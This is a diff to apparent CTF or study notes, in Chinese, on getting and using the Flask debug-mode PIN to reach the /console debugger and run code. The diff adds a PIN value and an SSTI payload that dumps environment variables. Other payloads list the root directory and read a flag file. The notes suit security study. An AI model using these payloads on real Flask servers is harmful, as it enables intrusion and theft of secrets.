@@ -3,6 +3,10 @@ Flask模板注入中debug模式下pin码的获取和利用:
 pin码是flask在开启debug模式下，进行代码调试模式所需的进入密码，需要正确的PIN码才能进入调试模式，可以理解为自带的webshell。
 有了pin，然后报错或访问/console进，点击一个条列的右边有一个终端按钮，点击进入控制台rce
 
+
+729-315-842
+
+
 ## **pin码生成要六要素**
 通常任意文件读取ssti：
 ```
@@ -17,6 +21,9 @@ pin码是flask在开启debug模式下，进行代码调试模式所需的进入�
 ```
 os.popen("ls -l /").read()
 os.popen("cat /this_is_the_flag.txt").read()
+
+
+__import__('os').popen("env").read()
 ```
 
 
